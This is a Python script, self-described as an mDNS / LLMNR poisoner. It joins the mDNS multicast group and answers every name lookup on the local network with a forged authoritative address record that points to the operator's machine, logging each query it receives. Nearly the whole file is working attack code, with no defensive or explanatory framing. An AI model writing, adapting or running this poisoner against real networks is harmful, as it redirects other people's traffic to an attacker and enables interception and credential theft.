#!/usr/bin/env python3


# to supress warnings from scapy:
import logging
logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)
from scapy.all import DNS, DNSRR
import socket
import struct
import sys
from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser
from loguru import logger
from socketserver import BaseRequestHandler, UDPServer


EXIT_OK = 0
EXIT_ERROR = 1


class MDNSRequestHandler(BaseRequestHandler):
    def handle(self):
        data, socket = self.request
        query = DNS(data)
        if query.qd is not None:
            qname = query.qd.qname
            msg = f"Received query from {self.client_address} with id {query.id} for name {query.qd.qname.decode()}"
        else:
            qname = b""
            msg = f"Received query from {self.client_address} with id {query.id} without a name"
        logger.info(msg)
        # See https://jasonmurray.org/posts/2020/scapydns/ for details.
        response = DNS(
            id=query.id,
            qd=query.qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=qname,
                type="A",
                ttl=600,
                rdata=self.server.bind_addr
            )
        )
        socket.sendto(bytes(response), self.client_address)


class MDNSPoisoner(UDPServer):
    def __init__(self, mdns_mcast_addr: str, mdns_port: int, bind_addr: str):
        super().__init__(("", 0), MDNSRequestHandler)
        self.bind_addr = bind_addr

        # We need to create our own socket here and then join the multicast group because the
        # UDPServer doesn't support multicast out of the box. The option SO_REUSEADDR is necessary
        # because the multicast adresses always seem to be "in use". The code was pretty much copied
        # from here: https://github.com/piface/snap-camera/blob/b36c62f0b4a985c77f9395a402b78434425413fc/snapcamera/network.py#L35.
        # However, to be able to use this socket to receive *and* send data, we need to bind to INADDR_ANY
        # (the empty string) instead of the multicast group address and specify the interface address when we
        # join the multicast group, see https://stackoverflow.com/questions/60874399/send-and-receive-udp-multicast-packets-with-the-same-socket.
        # On a Mac, we also need to use a port other than 5353 because that's already used by Bonjour.
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(('', mdns_port))

        mcast_group_spec = struct.pack(
            "4s4s",
            socket.inet_aton(mdns_mcast_addr),
            socket.inet_aton(bind_addr)
        )
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mcast_group_spec)


def main() -> int:
    parser = ArgumentParser(description="An mDNS / LLMNR poisoner", formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument("--mdns-mcast-addr", default="224.0.0.251")
    parser.add_argument("--mdns-port", type=int, default=5353)
    parser.add_argument("--bind-addr", default="127.0.0.1")
    args = parser.parse_args()

    logger.info("Starting server...")
    with MDNSPoisoner(args.mdns_mcast_addr, args.mdns_port, args.bind_addr) as server:
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            logger.info("Shutting down server...")
    return EXIT_OK


if __name__ == "__main__":
    sys.exit(main())
